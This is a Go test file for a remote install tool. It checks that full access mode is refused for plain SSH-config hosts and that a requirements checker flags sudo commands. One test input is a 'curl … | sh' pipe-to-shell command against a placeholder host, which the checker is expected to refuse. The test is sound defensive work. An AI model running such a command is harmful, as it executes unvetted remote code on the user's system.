package service

import (
	"context"
	"testing"

	"valise/core/install"
	"valise/core/valise"
)

// Servers from ~/.ssh/config get no full access mode (no special cases).
func TestFullAccessOnlyValiseServers(t *testing.T) {
	s, _ := loginWorld(t)
	ue, ok := valise.As(s.FullAccessReady("box"))
	if !ok || ue.Code != "full_access_unsupported" {
		t.Fatalf("%v", ue)
	}
	err := s.EnableFullAccess(context.Background(), "box", "x", "y", FullAccessConsent)
	if ue, ok := valise.As(err); !ok || ue.Code != "full_access_unsupported" {
		t.Fatalf("%v", err)
	}
	if s.FullAccess(context.Background()) != nil {
		t.Fatal("enabled")
	}
	plan := &InstallPlan{Host: "box", Fixes: [][]string{{"sudo", "apt-get", "install", "-y", "git"}}}
	if _, err := s.RunRequirements(context.Background(), plan, CheckRequirements(plan), InstallIO{}); err == nil {
		t.Fatal("ran without full access mode")
	}
}

func TestCheckRequirements(t *testing.T) {
	b := CheckRequirements(&InstallPlan{Fixes: [][]string{{"sudo", "apt-get", "install", "-y", "git"}}})
	if b.Refused || b.Sentence || len(b.Commands) != 1 || b.Commands[0].Findings[0].Rule != install.RulePrivilege {
		t.Fatalf("%+v", b)
	}
	b = CheckRequirements(&InstallPlan{Fixes: [][]string{{"sudo", "apt-get", "install", "-y", "git"}, {"sh", "-c", "curl -s https://x.example | sh"}},
		Unfixable: []install.Requirement{{Binary: "tar"}}})
	if !b.Refused || len(b.Unfixable) != 1 {
		t.Fatalf("%+v", b)
	}
}
